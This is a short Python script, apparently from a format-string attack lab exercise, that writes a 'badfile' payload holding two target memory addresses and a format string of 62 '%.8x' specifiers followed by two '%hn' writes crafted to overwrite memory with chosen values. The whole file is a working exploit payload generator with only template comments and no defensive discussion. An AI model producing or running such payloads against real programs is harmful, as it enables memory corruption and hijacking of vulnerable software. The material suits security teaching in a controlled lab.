
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e506A
number2 = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (number2).to_bytes(4,byteorder='little')
# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("oooo").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
C = 62
D = 0xAABB - 12 - 8*C
E = 0xCCDD - 0xAABB
s = "%.8x"*C + "%." + str(D) + "x" + "%hn" + "%." + str(E) + "x" + "%hn"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
